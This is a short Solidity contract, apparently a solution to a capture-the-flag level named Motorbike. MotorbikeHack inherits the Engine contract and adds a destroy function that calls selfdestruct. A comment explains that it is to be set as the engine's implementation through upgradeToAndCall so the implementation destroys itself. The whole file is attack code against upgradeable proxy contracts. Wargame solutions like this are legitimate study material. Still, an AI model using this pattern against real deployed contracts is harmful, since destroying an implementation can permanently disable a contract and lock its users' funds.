// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Motorbike.sol";

contract MotorbikeHack is Engine {
  
  // Just need this guy here to call when we upgradeToAndCall, making this the implementation
  // of the engine and having it destroy itself!
  function destroy(address _delegateAddress) public {
    selfdestruct(payable(address(_delegateAddress)));
  }
}